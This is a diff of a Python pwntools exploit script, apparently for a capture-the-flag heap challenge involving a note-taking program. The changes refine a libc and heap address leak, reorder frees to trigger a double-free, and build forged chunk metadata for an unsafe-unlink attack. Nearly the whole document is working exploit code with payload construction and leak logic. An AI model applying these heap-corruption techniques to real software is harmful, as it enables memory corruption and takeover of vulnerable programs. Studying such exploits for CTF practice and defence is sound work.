@@ -24,7 +24,7 @@ def delete_note(n):
 #
 # 1 free() -> fd & bk pointer points <main_arena>
 #
-def leak_main_arena():
+def leak_libc():
     r.send('1\n')
     r.recvuntil('CCCCCCCC')
     l = r.recvuntil('\n')
@@ -58,7 +58,6 @@ def leak_heap():
     l = u64(l)
     log.info('leaked heap: 0x%x' % l)
     return l
-
 
 if __name__ == "__main__":
 
@@ -106,11 +105,9 @@ if __name__ == "__main__":
 
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
-    main_arena = leak_main_arena() 
+    leaked_libc = leak_libc() 
 
-    log.info('main_arena: 0x%x' % main_arena)
-
-    raw_input('after leaking main_arena...')
+    raw_input('after leaking libc...')
 
     delete_note(0)
     delete_note(1)
@@ -154,8 +151,8 @@ if __name__ == "__main__":
     
     raw_input('after alloc two chunks...')
 
-    delete_note(1)
     delete_note(0)
+    delete_note(1)
 
     raw_input('after free two chunks...')
 
@@ -163,7 +160,6 @@ if __name__ == "__main__":
     # Step 2)
     #
     # Land the carefully crafted one big chunk which will overwrite the metadata of already free chunks
-    # Remember it has double-free vulnerability!
     #
     # What will happen:
     #
@@ -179,15 +175,19 @@ if __name__ == "__main__":
     # FD->bk == P && BK->fd == P
     # 
 
-    target = leaked_heap - (0x10a6820-0x10a5030)
+    target = leaked_heap - 6128
 
     log.info('target address: 0x%x' % target)
+    log.info('chunk_0: 0x%x' % leaked_heap)
+    log.info('chunk_1: 0x%x' % (leaked_heap+16+0x80))
 
-    new_note(p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32) + p64(0x80) + p64(0x90) + 'B'*(0x80))
+    chunk_0 = p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32)
+    chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80
+    new_note(chunk_0 + chunk_1)
 
     raw_input('after overwriting metadata...')
 
-    log.info('trying to free 0x%x...' % (leaked_heap+8*4+0x80))
+    log.info('trying to free 0x%x...' % (leaked_heap+16+0x80+16))
     raw_input('before free...')
 
     #
